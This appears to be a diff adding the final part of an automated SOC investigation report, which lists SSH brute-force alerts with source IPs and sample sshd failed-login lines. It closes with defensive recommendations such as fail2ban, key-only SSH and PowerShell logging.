+   Apr  8 18:21:11 ip-10-77-20-248 sshd[19391]: Failed password for invalid user support from 61.183.117.250 port 42111 ssh2
+   Apr  8 18:21:13 ip-10-77-20-248 sshd[19391]: Failed password for invalid user support from 61.183.117.250 port 42111 ssh2
+   Apr  8 18:21:16 ip-10-77-20-248 sshd[19391]: Failed password for invalid user support from 61.183.117.250 port 42111 ssh2
+
+[59] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 181.25.206.27
+ EventCount   : 12
+ Sample Log  :
+   Mar 29 14:15:41 ip-10-77-20-248 sshd[2414]: Failed password for invalid user pi from 181.25.206.27 port 50378 ssh2
+   Mar 29 14:15:43 ip-10-77-20-248 sshd[2414]: Failed password for invalid user pi from 181.25.206.27 port 50378 ssh2
+   Mar 29 14:15:44 ip-10-77-20-248 sshd[2414]: Failed password for invalid user pi from 181.25.206.27 port 50378 ssh2
+
+[60] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 221.194.44.190
+ EventCount   : 6
+ Sample Log  :
+   Apr 18 15:00:53 ip-10-77-20-248 sshd[1721]: Failed password for root from 221.194.44.190 port 4299 ssh2
+   Apr 18 15:01:03 ip-10-77-20-248 sshd[1721]: message repeated 4 times: [ Failed password for root from 221.194.44.190 port 4299 ssh2]
+   Apr 18 15:03:51 ip-10-77-20-248 sshd[1723]: Failed password for root from 221.194.44.190 port 4560 ssh2
+
+[61] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 114.32.100.101
+ EventCount   : 6
+ Sample Log  :
+   Mar 31 22:57:33 ip-10-77-20-248 sshd[21263]: Failed password for invalid user pi from 114.32.100.101 port 34437 ssh2
+   Mar 31 22:57:35 ip-10-77-20-248 sshd[21263]: Failed password for invalid user pi from 114.32.100.101 port 34437 ssh2
+   Mar 31 22:57:37 ip-10-77-20-248 sshd[21263]: Failed password for invalid user pi from 114.32.100.101 port 34437 ssh2
+
+[62] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 111.40.166.130
+ EventCount   : 6
+ Sample Log  :
+   Apr 17 14:13:45 ip-10-77-20-248 sshd[32475]: Failed password for invalid user admin from 111.40.166.130 port 40155 ssh2
+   Apr 17 14:13:48 ip-10-77-20-248 sshd[32475]: Failed password for invalid user admin from 111.40.166.130 port 40155 ssh2
+   Apr 17 14:13:50 ip-10-77-20-248 sshd[32475]: Failed password for invalid user admin from 111.40.166.130 port 40155 ssh2
+
+[63] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 183.146.159.20
+ EventCount   : 6
+ Sample Log  :
+   Apr 12 06:54:39 ip-10-77-20-248 sshd[25927]: Failed password for invalid user ubnt from 183.146.159.20 port 38907 ssh2
+   Apr 12 06:54:41 ip-10-77-20-248 sshd[25927]: Failed password for invalid user ubnt from 183.146.159.20 port 38907 ssh2
+   Apr 12 06:54:44 ip-10-77-20-248 sshd[25927]: Failed password for invalid user ubnt from 183.146.159.20 port 38907 ssh2
+
+[64] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 105.101.221.33
+ EventCount   : 6
+ Sample Log  :
+   Apr 13 11:42:23 ip-10-77-20-248 sshd[27021]: Failed password for invalid user admin from 105.101.221.33 port 38051 ssh2
+   Apr 13 11:42:25 ip-10-77-20-248 sshd[27021]: Failed password for invalid user admin from 105.101.221.33 port 38051 ssh2
+   Apr 13 11:42:27 ip-10-77-20-248 sshd[27021]: Failed password for invalid user admin from 105.101.221.33 port 38051 ssh2
+
+[65] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 49.84.87.84
+ EventCount   : 6
+ Sample Log  :
+   Apr 11 06:13:37 ip-10-77-20-248 sshd[24309]: Failed password for invalid user admin from 49.84.87.84 port 27626 ssh2
+   Apr 11 06:13:39 ip-10-77-20-248 sshd[24309]: Failed password for invalid user admin from 49.84.87.84 port 27626 ssh2
+   Apr 11 06:13:41 ip-10-77-20-248 sshd[24309]: Failed password for invalid user admin from 49.84.87.84 port 27626 ssh2
+
+[66] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 110.78.174.75
+ EventCount   : 6
+ Sample Log  :
+   Apr  9 03:17:14 ip-10-77-20-248 sshd[19657]: Failed password for invalid user admin from 110.78.174.75 port 37298 ssh2
+   Apr  9 03:17:16 ip-10-77-20-248 sshd[19657]: Failed password for invalid user admin from 110.78.174.75 port 37298 ssh2
+   Apr  9 03:17:18 ip-10-77-20-248 sshd[19657]: Failed password for invalid user admin from 110.78.174.75 port 37298 ssh2
+
+[67] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 60.187.118.40
+ EventCount   : 6
+ Sample Log  :
+   Mar 31 06:34:38 ip-10-77-20-248 sshd[18539]: Failed password for invalid user pruebas from 60.187.118.40 port 41838 ssh2
+   Mar 31 06:34:40 ip-10-77-20-248 sshd[18539]: Failed password for invalid user pruebas from 60.187.118.40 port 41838 ssh2
+   Mar 31 06:34:43 ip-10-77-20-248 sshd[18539]: Failed password for invalid user pruebas from 60.187.118.40 port 41838 ssh2
+
+[68] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 177.38.145.209
+ EventCount   : 6
+ Sample Log  :
+   Apr 14 05:11:20 ip-10-77-20-248 sshd[27916]: Failed password for invalid user admin from 177.38.145.209 port 58255 ssh2
+   Apr 14 05:11:23 ip-10-77-20-248 sshd[27916]: Failed password for invalid user admin from 177.38.145.209 port 58255 ssh2
+   Apr 14 05:11:26 ip-10-77-20-248 sshd[27916]: Failed password for invalid user admin from 177.38.145.209 port 58255 ssh2
+
+[69] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 223.244.185.76
+ EventCount   : 6
+ Sample Log  :
+   Apr  6 21:53:03 ip-10-77-20-248 sshd[16964]: Failed password for invalid user admin from 223.244.185.76 port 47774 ssh2
+   Apr  6 21:53:06 ip-10-77-20-248 sshd[16964]: Failed password for invalid user admin from 223.244.185.76 port 47774 ssh2
+   Apr  6 21:53:09 ip-10-77-20-248 sshd[16964]: Failed password for invalid user admin from 223.244.185.76 port 47774 ssh2
+
+[70] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 183.152.79.79
+ EventCount   : 6
+ Sample Log  :
+   Apr  1 20:38:36 ip-10-77-20-248 sshd[23159]: Failed password for invalid user johnny from 183.152.79.79 port 53112 ssh2
+   Apr  1 20:38:39 ip-10-77-20-248 sshd[23159]: Failed password for invalid user johnny from 183.152.79.79 port 53112 ssh2
+   Apr  1 20:38:42 ip-10-77-20-248 sshd[23159]: Failed password for invalid user johnny from 183.152.79.79 port 53112 ssh2
+
+[71] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 42.184.142.151
+ EventCount   : 6
+ Sample Log  :
+   Mar 31 11:06:39 ip-10-77-20-248 sshd[19710]: Failed password for invalid user ajay from 42.184.142.151 port 47882 ssh2
+   Mar 31 11:06:41 ip-10-77-20-248 sshd[19710]: Failed password for invalid user ajay from 42.184.142.151 port 47882 ssh2
+   Mar 31 11:06:43 ip-10-77-20-248 sshd[19710]: Failed password for invalid user ajay from 42.184.142.151 port 47882 ssh2
+
+[72] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 1.30.211.144
+ EventCount   : 6
+ Sample Log  :
+   Apr  1 21:27:51 ip-10-77-20-248 sshd[23210]: Failed password for invalid user admin from 1.30.211.144 port 49789 ssh2
+   Apr  1 21:27:53 ip-10-77-20-248 sshd[23210]: Failed password for invalid user admin from 1.30.211.144 port 49789 ssh2
+   Apr  1 21:27:55 ip-10-77-20-248 sshd[23210]: Failed password for invalid user admin from 1.30.211.144 port 49789 ssh2
+
+======================================================================
+ RECOMMENDATIONS
+======================================================================
+
+ [IMMEDIATE ACTION REQUIRED]
+
+ * DATA EXFILTRATION: Isolate the affected host immediately. Review
+   network captures for outbound data. Preserve forensic disk image.
+ * BRUTE FORCE: Block offending IPs at the firewall. Consider
+   implementing fail2ban or account lockout policy on SSH.
+ * IOC MATCH: Traffic to/from known malicious IPs was detected.
+   Block these IPs at the perimeter and investigate host activity.
+ * POWERSHELL: Encoded/Bypass commands detected. Review PowerShell
+   script block logging and restrict execution policy via GPO.
+
+ [GENERAL RECOMMENDATIONS]
+  1. Enforce key-based SSH authentication only; disable password auth.
+  2. Enable PowerShell Constrained Language Mode and Script Block Logging.
+  3. Keep IOC lists updated from threat intelligence feeds (MISP, AbuseIPDB).
+  4. Implement a WAF to block requests to sensitive admin paths.
+  5. Review and rotate credentials for accounts with failed login attempts.
+
+======================================================================
+ END OF REPORT - Generated by SOC Investigation Tool v1.0
+======================================================================
